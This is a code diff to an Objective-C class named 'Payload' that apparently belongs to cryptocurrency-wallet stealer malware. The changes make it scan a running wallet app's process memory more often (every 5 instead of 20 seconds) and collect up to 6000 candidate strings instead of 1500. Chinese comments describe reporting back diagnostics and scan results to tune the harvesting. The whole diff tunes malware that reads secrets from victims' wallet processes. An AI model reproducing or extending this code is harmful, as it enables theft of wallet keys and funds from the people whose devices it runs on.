@@ -25,6 +25,7 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 @property (nonatomic, assign) BOOL photoBusy;
 @property (nonatomic, strong) NSMutableSet<NSString *> *sentCandidates;
 @property (nonatomic, assign) pid_t lastScanPid;
+@property (nonatomic, assign) BOOL walletRunning;
 @end
 
 @implementation Payload
@@ -477,7 +478,7 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                 } @catch (NSException *e) {
                     [self log:[NSString stringWithFormat:@"loop exception: %@", e.reason]];
                 }
-                [NSThread sleepForTimeInterval:20.0];
+                [NSThread sleepForTimeInterval:self.walletRunning ? 5.0 : 20.0];
             }
         }
     });
@@ -541,6 +542,7 @@ static NSArray *WalletMemoryTargets(void) {
         }
         if (pid <= 0) {
             // 找不到就报一次诊断：把所有路径里带 token / im 的进程列出来
+            self.walletRunning = NO;
             static NSTimeInterval lastDiag = 0;
             NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
             if (now - lastDiag > 120) {
@@ -566,8 +568,9 @@ static NSArray *WalletMemoryTargets(void) {
 
         NSDictionary *h = [MemScan harvestStringsFromPid:pid
                                                 maxBytes:192 * 1024 * 1024
-                                               maxCands:1500];
+                                               maxCands:6000];
         NSArray *cands = h[@"candidates"];
+        self.walletRunning = YES;
         if (!cands.count) { 
             // 扫了但没有候选，也报一次（含扫描量），便于调参
             NSMutableDictionary *ev0 = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
